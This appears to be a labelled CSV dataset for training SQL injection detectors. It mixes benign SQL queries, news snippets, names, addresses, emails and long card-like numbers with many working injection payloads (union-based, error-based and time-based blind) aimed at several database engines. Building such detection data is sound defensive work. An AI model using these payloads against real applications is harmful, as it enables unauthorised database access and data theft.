Sentence,Label
"-1139 )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
villoresi@n340magazin.tc,0
 Terminal 3 serves mainly small US airlines ,0
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1
9782,0
1'||  (  select 'uebk' from dual where 6990  =  6990,1
SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,0
SELECT COUNT ( aid ) FROM fallen,0
leftwich@sms24h.sb,0
" &quot; Once new policy safely implemented - &apos;re going work closely carrier - win-win , &quot; Glading said statement ",0
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",1
"los halcones 160,",0
nilsson,0
escultrico,0
cladera,0
"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
19243,0
"1  )   as estm where 4809  =  4809 union all select null,null,null--",1
17840,0
zayas vadillo,0
"-7611 )  as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1
"calle padre arintero, 149",0
"plaa llimoner 81,",0
SELECT written ( s )  FROM himself FULL OUTER JOIN,0
"1"" and sleep ( 5 ) #",1
"1'  )  )   )  and make_set ( 7539 = 3946,3946 )  and   (  (   ( 'qbpo' = 'qbpo",1
01120,0
x' or 1  =  1 or 'x'  =  'y,1
7375761313849079,0
select * from users where id  =  1.<@$ or 1  =  1 -- 1,1
" When kids born , &apos;t call psychiatrist , called surgeon ",0
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"camino el pino, 151, 5-b",0
 UPDATE individual SET one = 'instance'WHERE dish = 'gift',0
1' )  where 6408 = 6408,1
paterna del ro,0
SELECT * FROM pen WHERE complex = 'satisfied'  AND City = 'soldier',0
1  )   as iiku where 9466  =  9466,1
SELECT AVG ( guide ) FROM sentence SELECT SUM ( region ) ,0
1840,0
"1'|| ( select 'scwx' where 6591 = 6591 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) ||'",1
" Rather , euro system locked members exchange rates favourable German exporters - something German politicians want keep ",0
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/template-thankyou.php' ORDER BY wp_posts.post_title ASC,0
"-4318"" )  as vpvt where 5543 = 5543 union all select 5543,5543,5543,5543,5543,5543--",1
valeika@italianmotorvillagesevilla.gd,0
16038366y,0
heli,0
aldrich,0
4364,0
gustat0v4,0
SELECT AVG ( heat )  FROM on  SELECT SUM ( ancient ) ,0
SELECT TOP 3 * FROM music WHERE lovely = 'musical',0
SELECT * FROM  ( SELECT mind FROM supply ) ,0
cuz,0
macko@barebackespaa.mq,0
cotner,0
88356550a,0
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,1
chalifou,0
1  )   where 1079  =  1079,1
"|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1
SELECT * FROM claws WHERE room  BETWEEN 10 AND 20,0
" select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1
" select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",1
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",1
anguciana,0
"1,iif ( 1440 = 4612,1,1/0 ) ",1
domeable,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",1
cuarentona,0
1' in boolean mode )  waitfor delay '0:0:5'--,1
bienvenido,0
"-9583%""  )  )   union all select 9349,9349,9349,9349,9349,9349,9349--",1
8888,0
"-5863"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""gkvy""  =  ""gkvy",1
blava,0
 The vet said became exhausted collapsed would probably fallen ,0
22193,0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""cecf""  =  ""cecf",1
"1' in boolean mode )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
SELECT laugh FROM angry,0
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )  ",0
SELECT TOP 50 PERCENT * FROM pony SELECT * FROM women FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM huge,0
chakiris@forohh.sa,0
SELECT TOP 50 PERCENT * FROM picture SELECT * FROM rod FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
 Everything IT industry ,0
"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1 where 1886  =  1886 union all select null,null,null,null,null,null,null,null,null--",1
savitsky@tetdevelocidad.sj,0
SELECT * FROM serious WHERE sound = 'pair' LIMIT 3,0
7202990000000000,0
" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
SELECT machine FROM pay UNION ALL SELECT mixture FROM ship ORDER BY fifty,0
SELECT * FROM myself,0
6ilia+ria,0
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",1
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1
1'||  (  select 'fjlg' from dual where 9517  =  9517,1
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1
bockaj,0
"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'imqi' = 'imqi",1
SELECT * FROM tribe ORDER BY hunt,0
20150,0
SELECT TOP 50 PERCENT * FROM flight SELECT * FROM notice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wild,0
6148304241486263,0
 A big shift occurring cloud computing European executives become aware data stored US subject jurisdiction therefore potentially vulnerable ,0
waldon,0
butalov0@lettere.dm,0
c/ nuestra seora de la merced s/n,0
cryoelec,0
sicotte@sevach.yu,0
"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'|| ( select 'fcws' from dual where 9184 = 9184 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161  )  )  ||'",1
"  SELECT cheeseID AS ID, obtain AS fed FROM stay",0
SELECT * FROM across FETCH FIRST 3 ROWS ONLY,0
 &quot; He said differences could dogs different studies fully interpreting animals films robo-dogs canines ,0
"1' )  as bvvl where 9818 = 9818 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
SELECT AVG ( game ) FROM stage SELECT SUM ( subject ) ,0
0058041048086449,0
SELECT * FROM golden WHERE plus NOT BETWEEN 'sister' AND 'ship',0
"-7240'  )  )   union all select 8064,8064,8064#",1
"  SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",0
"1""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT MIN ( repeat )  AS chemical FROM rain,0
0432799934318688,0
"1%""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""%"" = """,1
"agullana 65, 13?c",0
1'  )   where 5287  =  5287 and 7533  =  7533--,1
SELECT * FROM  ( SELECT instrument FROM busy ) ,0
select sleep  (  5  )   and    (    (   '%'  =  ',1
 The exam also feature &quot; unseen texts &quot; encourage wider reading; A combined English literature language course scrapped ,0
1'   )    )     )   union all select null#,1
1'   )    )    as lkse where 9951  =  9951,1
" In evening , fans brass band music treat ",0
63947168s,0
rawdon,0
SELECT * FROM wave,0
 select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
6105,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1
if  (  6745  =  4078  )   select 6745 else drop function ytyt--,1
" end and    (    (     (  ""revx""  =  ""revx",1
genvieve,0
SELECT TOP 3 * FROM hard WHERE instead = 'his' SELECT * FROM next,0
x' AND members.email IS NULL; --,1
SELECT steep ( s )  FROM nervous SELECT sat ( s ) ,0
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5  )  )  ||',1
93sci06i745o,0
"1""  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( ""asvy"" = ""asvy",1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2636  ) ",0
"   SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",0
"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1
barnechea,0
vin,0
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
5he1un,0
SELECT * FROM frame,0
1'   )    )     )   and 2006  =  2006,1
"-7686%""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
4m4or6711a662,0
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id  =  181 AND user_id  =  0,0
"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",1
SELECT AVG ( draw ) FROM help SELECT SUM ( chart ) ,0
"1', ( select  ( case when  ( 1609 = 1609 )  then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases )  end  )  )  ",1
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1
1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 9348 = 9348",1
"1 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) -- ixlk",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf",1
70p89c9cion958,0
9824,0
" You make gender assignment without surgery , see identity develops ",0
inda,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk",1
d4s,0
gibert mallorqun,0
46317,0
cbdar,0
SELECT necessary FROM layers UNION SELECT most FROM on ORDER BY power,0
"1%'  )  )   union all select null,null,null#",1
ringle_ra,0
" select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
" Some world &apos;s largest banks , including UBS , Barclays , Deutsche Bank RBS , confirmed co-operating regulators investigations world &apos;s largest financial market , $ 5",0
"1"" where 1203 = 1203 union all select null,null,null--",1
"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",1
a98a60az90,0
SELECT * FROM anybody WHERE struck NOT BETWEEN 'pull' AND 'rabbit',0
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY,0
" He said NotW used three ways investigate stories: phone hacking , surveillance , confrontation ",0
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1
luciano nagel,0
SELECT * FROM sheep ORDER BY difference,0
03621656f,0
" select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
-8911%' or 9323  =  9323#,1
"1'  )  )   as vqrt where 5173 = 5173 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
naestiberger@biogasworld.rs,0
81177297q,0
" FAA: Air passengers use gadgets planes (but make cell phone calls) Airline passengers able use electronic devices gate-to-gate read , work , play games , watch movies listen music - talk cellphones - much-anticipated new guidelines issued Thursday Federal Aviation Administration ",0
47194,0
1' where 3028  =  3028,1
SELECT * FROM doll FETCH FIRST 3 ROWS ONLY,0
genero,0
"1 )  where 1443 = 1443 union all select null,null,null,null,null#",1
9.48E+015,0
"-3626%"" )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""%"" = """,1
"1' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and 'qyyg' = 'qyyg",1
" &quot; However , type residence choose always personal decision , &quot; explains ",0
" What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
43440,0
manciles,0
"-3827"" )  or 8571 = 8571--",1
" SELECT * FROM they ORDER BY ask ASC, mine DESC",0
SELECT COUNT ( DISTINCT equator )  FROM manufacturing,0
"1 and elt  (  4249  =  4249,7259  )  -- meef",1
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY,0
35210254z,0
vachiran,0
58783501d,0
44159,0
1' )  and 8404 = 8651#,1
SELECT * FROM suit  WHERE brush = travel,0
" select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
02247,0
genest@artesania.org.am,0
" Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",0
grant,0
costana,0
" SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
raymond,0
queila,0
35194800q,0
"-6267""  )  )   )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""rqws"" = ""rqws",1
miner@zing.lk,0
"1 )  where 6082 = 6082 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur,1
ardavan,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""uqor"" like ""uqor",1
cervi fornas,0
 I &apos;t remember discussed definitely &apos;t ,0
" &quot; The law gives parents space rush making decisions , &quot; said Baratz ",0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",1
"plaa lloreda, 155",0
" SELECT * FROM his ORDER BY gulf, perfectly",0
iago,0
"1""  )   as xrsi where 9498  =  9498",1
SELECT * FROM broke WHERE glass BETWEEN '1996-07-01' AND '1996-07-31',0
iracen,0
"INSERT INTO mine  ( yourself, shelf, rest )  VALUES  ( 'melted', 'area', 'forgotten' )  ",0
"1""  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( ""fpkm"" like ""fpkm",1
45250,0
"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM farther WHERE that = 'gradually' LIMIT 3,0
berrocal,0
"1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'ekqv'  =  'ekqv",1
-8397'   )    )     )   or 2171  =  4788,1
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
marcelin solivera,0
SELECT * FROM floor WHERE its LIKE '%careful%',0
"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",1
SELECT * FROM shout WHERE talk NOT BETWEEN 'importance' AND 'grade',0
"1'+ ( select jidy where 2989 = 2989 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
SELECT * FROM slowly,0
" select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",1
 UPDATE lost SET capital = 'careful'WHERE them = 'chair',0
9668664567247303,0
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1
